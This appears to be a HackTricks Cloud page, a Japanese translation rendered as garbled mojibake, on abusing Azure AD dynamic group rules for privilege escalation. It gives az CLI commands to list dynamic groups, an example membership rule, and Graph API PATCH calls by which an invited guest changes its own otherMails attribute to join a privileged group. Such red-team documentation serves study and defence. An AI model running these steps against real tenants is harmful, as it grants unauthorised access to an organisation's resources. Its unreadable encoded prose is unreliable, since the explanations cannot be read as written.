# Az - ãƒ€ã‚¤ãƒŠãƒŸãƒƒã‚¯ã‚°ãƒ«ãƒ¼ãƒ—ã®ç‰¹æ¨©æ˜‡æ ¼

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

**ãƒ€ã‚¤ãƒŠãƒŸãƒƒã‚¯ã‚°ãƒ«ãƒ¼ãƒ—**ã¯ã€è¨­å®šã•ã‚ŒãŸ**ãƒ«ãƒ¼ãƒ«**ã®ã‚»ãƒƒãƒˆã‚’æŒã¤ã‚°ãƒ«ãƒ¼ãƒ—ã§ã‚ã‚Šã€ãƒ«ãƒ¼ãƒ«ã«ä¸€è‡´ã™ã‚‹ã™ã¹ã¦ã®**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ãƒ‡ãƒã‚¤ã‚¹**ãŒã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã•ã‚Œã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ãƒ‡ãƒã‚¤ã‚¹ã®**å±æ€§**ãŒ**å¤‰æ›´**ã•ã‚Œã‚‹ãŸã³ã«ã€ãƒ€ã‚¤ãƒŠãƒŸãƒƒã‚¯ãƒ«ãƒ¼ãƒ«ãŒ**å†ç¢ºèª**ã•ã‚Œã¾ã™ã€‚ã¾ãŸã€**æ–°ã—ã„ãƒ«ãƒ¼ãƒ«**ãŒ**ä½œæˆ**ã•ã‚Œã‚‹ã¨ã€ã™ã¹ã¦ã®ãƒ‡ãƒã‚¤ã‚¹ã¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**ç¢ºèª**ã•ã‚Œã¾ã™ã€‚

ãƒ€ã‚¤ãƒŠãƒŸãƒƒã‚¯ã‚°ãƒ«ãƒ¼ãƒ—ã«ã¯**Azure RBACãƒ­ãƒ¼ãƒ«**ã‚’å‰²ã‚Šå½“ã¦ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€**AzureADãƒ­ãƒ¼ãƒ«**ã‚’ãƒ€ã‚¤ãƒŠãƒŸãƒƒã‚¯ã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã™ã‚‹ã“ã¨ã¯**ã§ãã¾ã›ã‚“**ã€‚

ã“ã®æ©Ÿèƒ½ã«ã¯Azure ADãƒ—ãƒ¬ãƒŸã‚¢ãƒ P1ãƒ©ã‚¤ã‚»ãƒ³ã‚¹ãŒå¿…è¦ã§ã™ã€‚

## ç‰¹æ¨©æ˜‡æ ¼

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒAzure ADã§ã‚²ã‚¹ãƒˆã‚’æ‹›å¾…ã§ãã‚‹ãŸã‚ã€ãƒ€ã‚¤ãƒŠãƒŸãƒƒã‚¯ã‚°ãƒ«ãƒ¼ãƒ—ã®**ãƒ«ãƒ¼ãƒ«**ãŒ**å±æ€§**ã«åŸºã¥ã„ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«**æ¨©é™**ã‚’ä¸ãˆã‚‹å ´åˆã€æ–°ã—ã„**ã‚²ã‚¹ãƒˆ**ã§ã“ã®å±æ€§ã‚’**è¨­å®š**ã—ã¦**ã‚²ã‚¹ãƒˆã‚’ä½œæˆ**ã—ã€**ç‰¹æ¨©ã‚’æ˜‡æ ¼**ã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã¾ãŸã€ã‚²ã‚¹ãƒˆã¯è‡ªåˆ†ã®ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ã‚’ç®¡ç†ã—ã€ã“ã‚Œã‚‰ã®å±æ€§ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

ãƒ€ã‚¤ãƒŠãƒŸãƒƒã‚¯ãƒ¡ãƒ³ãƒãƒ¼ã‚·ãƒƒãƒ—ã‚’è¨±å¯ã™ã‚‹ã‚°ãƒ«ãƒ¼ãƒ—ã‚’å–å¾—ã™ã‚‹ï¼š**`az ad group list --query "[?contains(groupTypes, 'DynamicMembership')]" --output table`**

### ä¾‹

* **ãƒ«ãƒ¼ãƒ«ã®ä¾‹**ï¼š`(user.otherMails -any (_ -contains "security")) -and (user.userType -eq "guest")`
* **ãƒ«ãƒ¼ãƒ«ã®èª¬æ˜**ï¼šæ–‡å­—åˆ—ã€Œsecurityã€ã‚’å«ã‚€äºŒæ¬¡ãƒ¡ãƒ¼ãƒ«ã‚’æŒã¤ã‚²ã‚¹ãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã•ã‚Œã¾ã™ã€‚

ã‚²ã‚¹ãƒˆãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã§æ‹›å¾…ã‚’å—ã‘å…¥ã‚Œã€[https://entra.microsoft.com/#view/Microsoft\_AAD\_IAM/TenantOverview.ReactView](https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView)ã§**ãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã®ç¾åœ¨ã®è¨­å®šã‚’ç¢ºèªã—ã¾ã™ã€‚\
æ®‹å¿µãªãŒã‚‰ã€ãƒšãƒ¼ã‚¸ã§ã¯å±æ€§å€¤ã‚’å¤‰æ›´ã§ããªã„ãŸã‚ã€APIã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š

{% code overflow="wrap" %}
```powershell
# Login with the gust user
az login --allow-no-subscriptions

# Get user object ID
az ad signed-in-user show

# Update otherMails
az rest --method PATCH \
--url "https://graph.microsoft.com/v1.0/users/<user-object-id>" \
--headers 'Content-Type=application/json' \
--body '{"otherMails": ["newemail@example.com", "anotheremail@example.com"]}'

# Verify the update
az rest --method GET \
--url "https://graph.microsoft.com/v1.0/users/<user-object-id>" \
--query "otherMails"
```
{% endcode %}

## å‚è€ƒæ–‡çŒ®

* [https://www.mnemonic.io/resources/blog/abusing-dynamic-groups-in-azure-ad-for-privilege-escalation/](https://www.mnemonic.io/resources/blog/abusing-dynamic-groups-in-azure-ad-for-privilege-escalation/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
